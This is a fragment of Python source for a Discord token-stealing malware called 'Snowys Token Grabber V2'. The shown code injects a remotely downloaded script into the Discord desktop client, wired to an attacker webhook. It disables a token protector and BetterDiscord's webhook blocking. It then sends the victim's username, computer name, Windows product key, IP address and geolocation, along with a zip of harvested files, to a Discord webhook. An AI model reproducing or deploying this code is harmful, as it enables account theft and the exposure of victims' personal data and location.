...
class Snowys_Token_Grabber_V2:
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\Snowys_Token_Grabber_V2"
                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    ...
                    if not x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Made by Snowy | https://github.com/Snowys-shaders/SnowysTokenLogger")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nMade by Snowy | https://github.com/Snowys-shaders/SnowysTokenLogger")
                    else:
                        try:
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        pass
                    try:
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Snowy"))
                    except FileExistsError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/Snowys-shaders/Injections/main/Injection.txt").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def bypassTokenProtector(self):
        ...
        try:
            ...
            with open(config, 'a') as f:
                f.write("\n\n//Snowy just shit on this token protector | https://github.com/Snowys-shaders")
        except Exception:
            pass
    ...
    def bypassBetterDiscord(self):
        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
            ...
            with open(bd, "rt", encoding="cp437") as f:
                content = f.read()
                content2 = content.replace("api/webhooks", "SnowyTheGoat")
            open(bd, "w").close()
    ...
    def SendInfo(self):
        ...
        try:
            ...
            pass
        _zipfile = os.path.join(self.appdata, f'Snowy.V2-[{os.getlogin()}].zip')
        ...
        embed = {
            "avatar_url":"https://user-images.githubusercontent.com/100890328/157987317-7fe05ba7-67f7-4052-bbf4-e52159be4d0c.gif",
            "embeds": [
                {
                    "author": {
                        "name": "Snowys Token Grabber.V2",
                        "url": "https://github.com/Snowys-shaders/SnowysTokenLogger",
                        "icon_url": "https://user-images.githubusercontent.com/100890328/157987317-7fe05ba7-67f7-4052-bbf4-e52159be4d0c.gif"
                    },
                    "description": f'**{os.getlogin()}** Just ran Snowys Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://user-images.githubusercontent.com/100890328/157987317-7fe05ba7-67f7-4052-bbf4-e52159be4d0c.gif"
                    },       

                    "footer": {
                      "text": "Snowy.#0002 https://github.com/Snowys-shaders/SnowysTokenLogger"
                    }
                }
            ]
        }
